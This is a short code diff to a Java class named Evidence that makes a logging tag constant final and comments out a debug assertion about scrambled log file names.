@@ -70,7 +70,7 @@ public final class Evidence {
 	};
 
 	/** The Constant TAG. */
-	private static String TAG = "Evidence";
+	private static final String TAG = "Evidence";
 	/** The first space. */
 	boolean firstSpace = true;
 
@@ -263,8 +263,8 @@ public final class Evidence {
 
 		fileName = dir + name.encName + EvidenceCollector.LOG_TMP;
 		if(Cfg.DEBUG) Check.asserts(fileName != null, "null fileName");
-		if(Cfg.DEBUG) Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
-				"file not scrambled");
+		//if(Cfg.DEBUG) Check.asserts(!fileName.endsWith(EvidenceCollector.LOG_TMP),
+		//		"file not scrambled");
 		// if(Cfg.DEBUG) Check.asserts(!fileName.endsWith("MOB"), "file not scrambled");
 		try {
 			fconn = new AutoFile(fileName);
